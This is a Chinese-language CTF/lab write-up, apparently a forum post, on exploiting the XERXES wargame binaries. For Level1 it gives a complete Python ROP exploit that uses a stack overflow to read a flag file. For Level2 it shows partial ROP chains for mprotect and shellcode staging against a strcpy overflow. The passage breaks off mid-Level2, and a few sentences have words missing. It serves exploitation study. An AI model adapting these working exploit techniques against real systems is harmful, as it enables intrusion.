
调用检查输入中`flag`字符串的出现次数，在检查发生之前没有解析符号链接，因此创建指向该标志的符号链接应该允许我们读取它

![](https://bbs.kanxue.com/upload/attach/201904/823237_EMKAG3ZKZHCMAEK.jpg)

这个确实是`flag`，但是根本就没有用到ROP，主要目的是学习ROP

要用到`store`，这是操作的相关代码

```
loc_80489d8:

    write_buf(arg0, " Please, how many bytes is your file?\n\n");

    write_buf(arg0, 0x8048fb0);

    memset(var_163, 0x0, 0x7);

    read(arg0, var_163, 0x6);

    var_C = atoi(var_163);

    var_10 = malloc(var_C);

    write_buf(arg0, 0x8048fb3);

    write_buf(arg0, 0x8048fb0);

    if (read(arg0, var_10, var_C) == var_C) {

            write_buf(arg0, "   XERXES is pleased to inform you\n    that your file was received\n        most successfully.\n");

    }

    else {

            write_buf(arg0, "   XERXES regrets to inform you\n    that an error occurred\n        while receiving your file.\n");

    }

    write_buf(arg0, " Please, give a filename:\n");

    write_buf(arg0, 0x8048fb0);

    memset(var_3C, 0x0, 0x20);

    read(arg0, var_3C, var_C);

    snprintf(var_15C, 0x100, "  XERXES will store\n   this data as '%s'.\n", var_3C);

    write_buf(arg0, var_15C);

    write_file(var_3C, var_10, var_C);

    eax = write_buf(arg0, "  XERXES wishes you\n      a NICE day.\n");

    return eax;
```

读取文件名时发生缓冲区溢出。如下所示，分配了32个字节。但是，将读取字节，这是之前提供的文件大小。如果此值大于32，则它将覆盖堆栈上的其他值

我无法使用`level1`权限调试正在运行的`setuid`二进制文件，因此我们必须将其复制到本地计算机来分析

```
scp level1@192.168.238.128:level1  level1
```

`gdb`在一个终端中打开并将`follow-fork-mode`设置为`child`

![](https://bbs.kanxue.com/upload/attach/201904/823237_VJMS5ZJU8Z6AEBA.jpg)

然后打开另一个终端并发送一个100字节的文件

![](https://bbs.kanxue.com/upload/attach/201904/823237_XRAGA66WP9E5M3W.jpg)

子进程崩溃，`EIP`指向`0x41414141`

![](https://bbs.kanxue.com/upload/attach/201904/823237_JHRMEVBZEKF4P4C.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_KJVJAHPH8YQY9HP.jpg)

重新生成一些字符串，算一下偏移

```
$ cyclic 100

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

$ nc localhost 8888

Welcome to 

 XERXES File Storage System

  available commands are:

  store, read, exit.



> store

 Please, how many bytes is your file?



> 101

 Please, send your file:



> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

   XERXES is pleased to inform you

    that your file was received

        most successfully.

 Please, give a filename:

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

^C

$ cyclic -l 0x61616171

64

$
```

需要在覆盖返回地址之前写入64个字符

首先找到`level1` `plt`表中的`open`/`read`/`write`的地址

![](https://bbs.kanxue.com/upload/attach/201904/823237_R7DHAE4T5DR62P6.jpg)

然后，找到`level1`中的`flag`字符串

![](https://bbs.kanxue.com/upload/attach/201904/823237_T9BW7FTXU97RNRA.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_BFW457KJN4UADUX.jpg)

最后，收集`level1`中的gadget，需要一些`pop2ret`和`pop3ret`

![](https://bbs.kanxue.com/upload/attach/201904/823237_HBWNH7K9GWK4HNG.jpg)

完成`rop`准备工作，各变量如下：

```
open_addr     = 0x80486d0

read_addr     = 0x8048640

write_addr    = 0x8048700

flag_addr     = 0x8049128

pop3_ret_addr = 0x08048ef6

pop2_ret_addr = 0x08048ef7

buf_addr     = 0x0804a000
```

编写EXP

```
#!/bin/env python



import struct

import telnetlib



def p(x):

    return struct.pack('<L', x)



# functions

open = 0x80486d0

read = 0x8048640

write = 0x8048700



# "flag" string

flag = 0x08049128



# gadgets

pop2ret = 0x08048ef7

pop3ret = 0x08048ef6



# empty payload

payload = ""



# padding

payload += "A" * 64



# open the flag file

payload += p(open)

payload += p(pop2ret)

payload += p(flag)          # pathname

payload += p(0x0)           # flags



# read the flag

payload += p(read)

payload += p(pop3ret)

payload += p(0x3)           # 0:stdin, 1:stdout, 2:stderr, 3:flag, 4:socket

payload += p(0x0804a000)    # buf

payload += p(0x80)          # nbyte



# write it to the connected socket

payload += p(write)

payload += "FAKE"

payload += p(0x4)           # fd

payload += p(0x0804a000)    # buf

payload += p(0x80)          # count



tn = telnetlib.Telnet("192.168.56.101", 8888)



# send store command

print tn.read_until("> ")

tn.write("store\n")



# send file size

print tn.read_until("> ")

tn.write("%d\n" % (len(payload) + 1))



# send file contents

print tn.read_until("> ")

tn.write(payload + "\n")



# send file name

print tn.read_until("> ")

tn.write(payload)



print tn.read_all()
```

![](https://bbs.kanxue.com/upload/attach/201904/823237_AXSPRMBTC7NCQ5A.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_547CGEQHHGMXUVJ.jpg)

运行exp拿到flag

![](https://bbs.kanxue.com/upload/attach/201904/823237_W7XFKVP5FF4DK8N.jpg)

# Level2

以`level2`和`tryharder`登录靶机，查看文件信息，`level2`为静态链接文件，开了NX保护

![](https://bbs.kanxue.com/upload/attach/201904/823237_9XYXTSXK7TA93G2.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_P8438NWAHKQAUU8.jpg)

查看题目说明，显然`strcpy`操作会导致变量`name`溢出

![](https://bbs.kanxue.com/upload/attach/201904/823237_NHTQP5URSED6CRX.jpg)

gdb调试查看溢出偏移为44个字节

![](https://bbs.kanxue.com/upload/attach/201904/823237_4XV7XVERM38C9FD.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_389UYDRWRQ85BC2.jpg)

没有进行任何边界检查，`strcpy`复制`argv[1]`到缓冲区就会发生溢出，需要提供多少字节才能覆盖`ret`地址？

![](https://bbs.kanxue.com/upload/attach/201904/823237_ABXTBTKJ8DNQBG2.jpg)

算一下偏移

![](https://bbs.kanxue.com/upload/attach/201904/823237_Q3NNK3J5TPNXCD9.jpg)

所以就是45-46-47-48字节会覆盖`ret`

由于是`strcpy`函数，在拷贝时会以`0x00`字节为结束符。这就提示我们，当我们打入的payload中间含有`0x00`字符时，其后的payload则不会顺利拷贝，从而导致无法正常执行获取shell

参考`level1`，我们必须使用`mprotect`和`read`系统调用

1. 修改数据段权限
2. 读入精心构造的shell
3. 跳转到shell处执行

注意，由于`0x00`的约束，`level0`直接调用函数的解题方式无法奏效，因此此题采用系统调用（`int 0x80`）的方式来实现第一步和第二步的操作。根据提示，我们可以通过`ropshell`网站来搜索二进制文件内我们所需的gadget

![](https://bbs.kanxue.com/upload/attach/201904/823237_E8KMCMPKDSPGKX6.jpg)

使用地址`0x080ca000`来存储shellcode，它是映射二进制文件的地址空间的一部分，可以使用`vmmap`里面的命令获取此信息

![](https://bbs.kanxue.com/upload/attach/201904/823237_NT9T6ZPQMTVDN5C.jpg)

标记内存区域后，我们需要从标准输入中读取shellcode，为了执行，需要按如下方式布置寄存器。

```
EAX = 3

EBX = 0

ECX = 0x080ca000

EDX = 128
```

我们需要使用gadget来执行每个系统调用

上传`level2`文件到，它提供了一个可搜索的界面，可以根据使用的寄存器或指令类型过滤gadget

![](https://bbs.kanxue.com/upload/attach/201904/823237_5G5S48VBESUDWTS.jpg)

`sys_mprotect`修改`.data`权限

要执行`mprotect(0x080ca000, 128, PROT_READ|PROT_WRITE|PROT_EXEC)`，因此寄存器需要包含以下值

```
edx = 0x7

ecx = 0x40

ebx = 0x80ca000

eax = 0x7d
```

实现的思想：在栈上放`0xffffffff`，而后，再通过8次即可。

网站查询到所需的gadget如下：

![](https://bbs.kanxue.com/upload/attach/201904/823237_Q68KT3VAFQ4ZABD.jpg)

实现的payload布局如下：

```
payload1 += pack(0x0000a476) #pop edx ; ret

payload1 += p32(0xffffffff) 

payload1 += pack(0x00006da1) #inc edx; add al, 0x83; ret

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)

payload1 += pack(0x00006da1)
```

实现的思想同上即可。所需的gadget信息如下：

![](https://bbs.kanxue.com/upload/attach/201904/823237_ZBTZVGZMGACRZ2C.jpg)

![](https://bbs.kanxue.com/upload/attach/201904/823237_6TAXCSV3Q6W6RHN.jpg)

实现的payload布局如下：

```
payload1 += pack(0x0000a49d)# pop ecx; pop ebx; ret

payload1 += p32(0xffffffff) # ecx

payload1 += p32(0x80ca001)  # 0x804a000+1 -> ebx



payload1 += pack(0x000806db) #inc ecx; ret

payload1 += pack(0x000806db) 

payload1 += pack(0x0004fd5a) #add ecx, ecx; ret

payload1 += pack(0x0004fd5a)

payload1 += pack(0x0004fd5a)

payload1 += pack(0x0004fd5a)

payload1 += pack(0x0004fd5a)

payload1 += pack(0x0004fd5a)
```

为实现的操作，上述gadget已完成`0x80ca001` pop -> `ebx`，只需再执行一次下面的gadget即可：

![](https://bbs.kanxue.com/upload/attach/201904/823237_G2V2WTD7K2YAQAT.jpg)

```
payload1 += pack(0x00007871) #dec ebx; ret
```

实现同样可利用组合操作实现
